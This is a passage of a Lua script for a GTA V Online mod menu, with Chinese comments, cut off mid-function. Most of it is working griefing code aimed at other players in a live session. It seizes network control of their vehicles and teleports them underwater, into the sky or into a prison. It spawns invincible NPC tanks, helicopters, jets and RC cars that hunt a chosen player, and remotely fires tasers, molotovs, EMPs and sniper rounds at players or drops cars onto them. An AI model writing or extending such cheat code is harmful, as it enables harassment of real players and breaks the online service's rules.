    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("开启防崩镜头", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("关闭防崩镜头", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end


------------------------------------
-----------载具恶搞-----------------
------------------------------------  

function log(content)
    if verbose then
        util.log("[GTLuaScript] " .. content)
    end
end

local function get_ground_z(coords)
    local start_time = os.time()
    while true do
        if os.time() - start_time >= 5 then
            log("未能在5秒内到达地面Z轴高度")
            return nil
        end
        local success, est = util.get_ground_z(coords['x'], coords['y'], coords['z']+2000)
        if success then
            log("成功获得地面 ： " .. est)
            return est
        end
        wait()
    end
end

function get_waypoint_coords()
    return HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
end

function set_player_into_suitable_seat(ent)
    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
    if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
        if driver ~= 0 then
            entities.delete_by_handle(driver)
        end
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
    else
        for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
            if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
            end
        end
    end
end

function request_control_of_entity(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        log("Requesting entity control of " .. ent)
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        local st_time = os.time()
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) do
            if os.time() - st_time >= 5 then
                util.log("未能在5秒内请求实体控制(实体 " .. ent .. ")")
                break
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            wait()
        end
    end
end

local function tp_player_car_to_coords(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        wait(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                util.toast("成功")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end

function tp_all_player_cars_to_coords(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tp_player_car_to_coords(pid, coord)
    end
end

function tpcartome(pid)
    tp_player_car_to_coords(pid, ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
end

function tocartopoint(pid)
    local c = get_waypoint_coords()
    if c ~= nil then
        tp_player_car_to_coords(pid, c)
    end
end

function tptomaze(pid)
    local c = {}
    c.x = -75.261375
    c.y = -818.674
    c.z = 326.17517
    tp_player_car_to_coords(pid, c)
end

function tptounderwater(pid)
    local c = {}
    c.x = 4497.2207
    c.y = 8028.3086
    c.z = -32.635174
    tp_player_car_to_coords(pid, c)
end

function tptohighair(pid)
    local c = {}
    c.x = -75
    c.y = -818
    c.z = 2400
    tp_player_car_to_coords(pid, c)
end

function tolsc(pid)
    local c = {}
    c.x = -353.84512
    c.y = -135.59108
    c.z = 39.009624
    tp_player_car_to_coords(pid, c)
end

function tpscp(pid)
    local c = {}
    c.x = 1642.8401
    c.y = 2570.7695
    c.z = 45.564854
    tp_player_car_to_coords(pid, c)
end

function tocell(pid)
    local c = {}
    c.x = 1737.1896
    c.y = 2634.897
    c.z = 45.56497
    tp_player_car_to_coords(pid, c)
end

local function create_trolly_vehicle(targetId, vehicleHash, pedHash)
    request_model(vehicleHash); request_model(pedHash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
    local driver = 0
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isTrollyVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
    end
    local offset = get_random_offset_from_entity(vehicle, 25.0, 25.0)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE(offset.x, offset.y, offset.z, outCoords, 1, 3.0, 0.0) then
        driver = entities.create_ped(5, pedHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, true, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, true)
        set_entity_face_entity(vehicle, targetPed, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 500.0, 786988, 0.0, 0.0, true)
        PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(driver, 1)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    end
    return vehicle, driver
end

local setInvincible = false
local count = 1
local AttackType <const> = {explode = 0, dropMine = 1}
local attacktype = 0
local selectedMine = 1
local mineSlider

function send_veh_attack(opt, index, pid)
    local pedHash <const> = util.joaat("mp_m_freemode_01")
		local i = 0
		repeat
			if opt == "Bandito" then
				local vehicleHash <const> = util.joaat("rcbandito")
				local pedHash <const> = util.joaat("mp_m_freemode_01")
				local vehicle, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				add_blip_for_entity(vehicle, 646, 4)
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setInvincible)
				ENTITY.SET_ENTITY_VISIBLE(driver, false, false)

			elseif opt == "Go-Kart" then
				local vehicleHash <const> = util.joaat("veto2")
				local gokart, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				ENTITY.SET_ENTITY_INVINCIBLE(gokart, setInvincible)
				VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
				VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
				ENTITY.SET_ENTITY_INVINCIBLE(driver, setInvincible)

				PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
				PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
				add_blip_for_entity(gokart, 748, 5)
			end
			i = i + 1
			wait(150)
		until i == count
    end

function send_veh_attack_god(toggle)
    setInvincible = toggle 
end

local GetMineHash = function()
    if selectedMine == 1 then
        return util.joaat("vehicle_weapon_mine_kinetic_rc")
    elseif selectedMine == 2 then
        return util.joaat("vehicle_weapon_mine_emp_rc")
    end
end

function send_veh_attacker(pid)
    local vehicleHash <const> = util.joaat("rcbandito")
    local pedHash <const> = util.joaat("mp_m_freemode_01")
    local lastShoot = newTimer()

    local bandito, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
    VEHICLE.SET_VEHICLE_MOD(bandito, 5, 3, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 48, 5, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 9, 0, false)
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(bandito, 128, 0, 128)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(bandito, 128, 0, 128)
    ENTITY.SET_ENTITY_VISIBLE(driver, false, false)
    local blip = add_blip_for_entity(bandito, 646, 27)

    util.create_tick_handler(function()
        if not ENTITY.DOES_ENTITY_EXIST(bandito) or ENTITY.IS_ENTITY_DEAD(bandito, false) or
        not ENTITY.DOES_ENTITY_EXIST(driver) or ENTITY.IS_ENTITY_DEAD(driver, false) then
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false

        elseif is_player_active(pid, false, true) then
            local playerPos = players.get_position(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(bandito, true)

            if playerPos:distance(pos) > 3.0 or not request_control_once(bandito) or
            not request_control_once(driver) then
                return
            end

            if attacktype == AttackType.explode then
                NETWORK.NETWORK_EXPLODE_VEHICLE(bandito, true, false, NETWORK.PARTICIPANT_ID_TO_INT())
                ENTITY.SET_ENTITY_HEALTH(driver, 0, 0)

            elseif attacktype == AttackType.dropMine and
            (not lastShoot.isEnabled() or lastShoot.elapsed() > 1000) and not
            MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, GetMineHash(), 3.0, true) then
                local weapon <const> = GetMineHash()

                if not WEAPON.HAS_WEAPON_ASSET_LOADED(weapon) then
                    WEAPON.REQUEST_WEAPON_ASSET(weapon, 31, 26)
                    return
                end

                local min, max = v3.new(), v3.new()
                local modelHash = ENTITY.GET_ENTITY_MODEL(bandito)
                MISC.GET_MODEL_DIMENSIONS(modelHash, min, max)

                local coord0 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, 0.2)
                local coord1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, min.z)

                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
                    coord0.x, coord0.y, coord0.z, coord1.x, coord1.y, coord1.z, 0, true, weapon, players.user(), true, false, -1.0, 0, false, false, 0, true, 1, 0, 0)
                lastShoot.reset()
            end
        elseif request_control(bandito) and request_control(driver) then
            TASK.CLEAR_PED_TASKS(driver)
            TASK.TASK_VEHICLE_DRIVE_WANDER(driver, bandito, 10.0, 786603)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            remove_decor(bandito)
            util.remove_blip(blip)
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        end
    end)
end

function send_veh_attacker_weapon(index, value)
    if index == 1 then
        attacktype = AttackType.explode
        menu.set_visible(mineSlider, false)
    elseif index == 2 then
        attacktype = AttackType.dropMine
        menu.set_visible(mineSlider, true)
    end
end

function send_veh_attacker_weapon_mine(index, value)
    selectedMine = index
end

function send_veh_attacker_number(value)
    count = value
end

DecorFlag_isTrollyVehicle = 1 << 0
function dele_all_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isTrollyVehicle) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            entities.delete_by_handle(driver)
            entities.delete_by_handle(vehicle)
        end
    end
end

DecorFlag_isEnemyVehicle = 1 << 1
local setGodmode = false
local gunnerWeapon = util.joaat("weapon_mg")
local weaponModId = -1


---@param targetId integer
local function spawn_minitank(targetId)
    local vehicleHash <const> = util.joaat("minitank")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash); request_model(pedHash)
    local pos = players.get_position(targetId)
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        return
    end
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isEnemyVehicle)
    local offset = get_random_offset_from_entity(vehicle, 35.0, 50.0)
    local outHeading = memory.alloc(4)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local driver = entities.create_ped(5, pedHash, offset, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        AUDIO.STOP_PED_SPEAKING(driver, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_PED_COMBAT_RANGE(driver, 2)
        PED.SET_PED_SEEING_RANGE(driver, 1000.0)
        PED.SET_PED_SHOOT_RATE(driver, 1000)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.SET_DRIVE_TASK_DRIVING_STYLE(driver, 786468)

        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setGodmode)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 10, weaponModId, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        local blip = add_blip_for_entity(vehicle, 742, 4)

        util.create_tick_handler(function()
            local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
            local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) or ENTITY.IS_ENTITY_DEAD(vehicle, false) or
            not ENTITY.DOES_ENTITY_EXIST(driver) or PED.IS_PED_INJURED(driver) then
                return false

            elseif not PED.IS_PED_IN_COMBAT(driver, target) and not PED.IS_PED_INJURED(target) then
                TASK.CLEAR_PED_TASKS(driver)
                TASK.TASK_COMBAT_PED(driver, target, 0, 16)
                PED.SET_PED_KEEP_TASK(driver, true)

            elseif not is_player_active(targetId, false, true) or
            players.get_position(targetId):distance(vehPos) > 1000.0 then
                TASK.CLEAR_PED_TASKS(driver)
                PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, false)
                TASK.TASK_VEHICLE_DRIVE_WANDER(driver, vehicle, 10.0, 786603)
                PED.SET_PED_KEEP_TASK(driver, true)
                remove_decor(vehicle)
                util.remove_blip(blip)
                local pVehicle = memory.alloc_int()
                memory.write_int(pVehicle, vehicle)
                ENTITY.SET_VEHICLE_AS_NO_LONGER_NEEDED(pVehicle)
                return false
            end
        end)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

---@param targetId integer
local function spawn_buzzard(targetId)
    local vehicleHash <const> = util.joaat("buzzard")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash);	request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local playerRelGroup = PED.GET_PED_RELATIONSHIP_GROUP_HASH(target)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), playerRelGroup)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, playerRelGroup, util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))

    local pos = players.get_position(targetId)
    local heli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(heli) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(heli), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(heli, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(heli), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(heli, true, 1)
        set_decor_flag(heli, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(target, 20.0, 40.0)
        pos.z = pos.z + 20.0
        ENTITY.SET_ENTITY_COORDS(heli, pos.x, pos.y, pos.z, false, false, false, false)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, setGodmode)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        local blip = add_blip_for_entity(heli, 422, 4)
        set_blip_name(blip, "buzzard2", true)

        local pilot = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
        PED.SET_PED_MAX_HEALTH(pilot, 500)
        ENTITY.SET_ENTITY_HEALTH(pilot, 500, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(pilot, setGodmode)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
        PED.SET_PED_KEEP_TASK(pilot, true)
        TASK.TASK_HELI_MISSION(pilot, heli, 0, target, 0.0, 0.0, 0.0, 23, 40.0, 40.0, -1.0, 0, 10, -1.0, 0)

        for seat = 1, 2 do
            local ped = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
            WEAPON.GIVE_WEAPON_TO_PED(ped, gunnerWeapon, -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)
            PED.SET_PED_MAX_HEALTH(ped, 500)
            ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(ped, setGodmode)
            PED.SET_PED_SHOOT_RATE(ped, 1000)
            PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, util.joaat("ARMY"))
            TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(ped, 200.0, 0)
        end
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
end

---@param targetId integer
local function spawn_lazer(targetId)
    local jetHash <const> = util.joaat("lazer")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(jetHash); request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = players.get_position(targetId)
    local jet = entities.create_vehicle(jetHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(jet) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(jet), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(jet, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(jet), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(jet, true, 1)
        set_decor_flag(jet, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(jet, 30.0, 80.0)
        pos.z = pos.z + 500.0
        ENTITY.SET_ENTITY_COORDS(jet, pos.x, pos.y, pos.z, false, false, false, false)
        set_entity_face_entity(jet, target, false)
        local blip = add_blip_for_entity(jet, 16, 4)
        set_blip_name(blip, "blip_4xz66m0", true) -- random collision for 0x2257C97F
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        ENTITY.SET_ENTITY_INVINCIBLE(jet, setGodmode)
        VEHICLE.SET_VEHICLE_FORCE_AFTERBURNER(jet, true)

        local pilot = entities.create_ped(5, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pilot, false, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target, 0.0, 0.0, 0.0, 6, 100.0, 0.0, 0.0, 80.0, 50.0, 0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, 60.0)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(jetHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

function veh_attacker_spawn(pid, index, option)
    local i = 0
    while i < count and players.exists(pid) do
        if option == "Minitank" then
            spawn_minitank(pid)
        elseif option == "Lazer" then
            spawn_lazer(pid)
        elseif option == "Buzzard" then spawn_buzzard(pid) end
        i = i + 1
        wait(150)
    end
end

local minitankModIds <const> =
{
    stockWeapon = -1,
    plasmaCannon = 1,
    rocket = 2,
}

function mintank_weapon(index)
    if index == 1 then
        weaponModId = minitankModIds.stockWeapon
    elseif index == 2 then
        weaponModId = minitankModIds.plasmaCannon
    elseif index == 3 then
        weaponModId = minitankModIds.rocket
    end
end

local gunnerWeapons <const> = {"weapon_mg", "weapon_rpg"}
function gunner_weapon(index)
    gunnerWeapon = util.joaat(gunnerWeapons[index])
end

function veh_attacker_spawn_count(value)
    count = value 
end

function veh_attacker_spawn_god(toggle)
    setGodmode = toggle
end

local deleteVehiclePassengers = function(vehicle)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) -1 do
        if VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seat, false) then
            continue
        end
        local passenger = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if request_control(passenger, 1000) then entities.delete_by_handle(passenger) end
    end
end

function dele_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isEnemyVehicle) and request_control(vehicle, 1000) then
            deleteVehiclePassengers(vehicle)
            entities.delete_by_handle(vehicle)
        end
    end
end

local usingTazer = false
local lastShot = newTimer()
function taze_weapon(pid, on)
    usingTazer = on
    while usingTazer and is_player_active(pid, false, true) and
    not util.is_session_transition_active() do
        if not lastShot.isEnabled() or lastShot.elapsed() > 2500 then
            local pos = players.get_position(pid)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 2.0, pos.x, pos.y, pos.z, 1, true, util.joaat("weapon_stungun"), players.user_ped(), true, true, -1.0)
            lastShot.reset()
        end
        wait()
    end
end

function spec_player(pid, toggle)
    local reference = menu.ref_by_path("Players>" .. players.get_name_with_tags(pid) .. ">Spectate>Ninja Method", 33)
    menu.trigger_command(reference, toggle and "on" or "off")
end

function heavy_weapon(pid)
    local hash <const> = util.joaat("weapon_heavysniper")
    local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(camPos.x, camPos.y, camPos.z, pos.x, pos.y, pos.z, 200, false, hash, players.user_ped(), true, false, -1.0)
end

function firework_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_firework")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function raypisol_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_raypistol")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function fire_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_molotov")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function emp_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_emplauncher")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end


function SmashCar(Veh_h, tar1,  invis_aveh, rate)
    local  CC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1.x, tar1.y, tar1.z + 5.0, 0, true, true, false)
    if invis_aveh then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, -1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     wait(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
 end
 
 function RamCar(Veh_h, tar1x, tar1y, tar1z, invis_aveh, targets, rate)
     local RC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1x, tar1y, tar1z, 0, true, true, false)
     if invis_aveh then
         ENTITY.SET_ENTITY_VISIBLE(RC, false, 0)
     end
     PFP(RC, targets)
     ENTITY.SET_ENTITY_INVINCIBLE(RC, true)
     VEHICLE.SET_VEHICLE_FORWARD_SPEED(RC, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(RC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(RC, true)
     wait(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(RC)
     entities.delete_by_handle(RC)
 end

vehaset = {invis_aveh = false, vehasel = util.joaat('speedo2') , vehra = 1000}
function vehpushandhit(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    local UV = ENTITY.GET_ENTITY_UPRIGHT_VALUE(targets)
    Delcar(targets)
    Streament(vehaset.vehasel)
    if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        SmashCar(vehaset.vehasel, tar1, vehaset.invis_aveh, vehaset.vehra)
